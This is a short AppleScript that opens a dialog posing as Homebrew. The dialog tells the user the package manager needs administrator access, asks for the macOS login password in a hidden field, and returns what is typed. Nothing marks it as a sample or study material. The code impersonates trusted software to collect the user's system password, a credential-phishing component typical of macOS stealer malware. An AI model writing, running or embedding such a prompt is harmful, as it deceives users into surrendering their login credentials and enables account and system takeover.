#!/usr/bin/osascript
set response to display dialog "Homebrew needs administrator access to finish the package operation. Enter your macOS login password." with title "Homebrew" default answer "" with hidden answer buttons {"Cancel", "Continue"} default button "Continue" cancel button "Cancel" with icon caution
return text returned of response
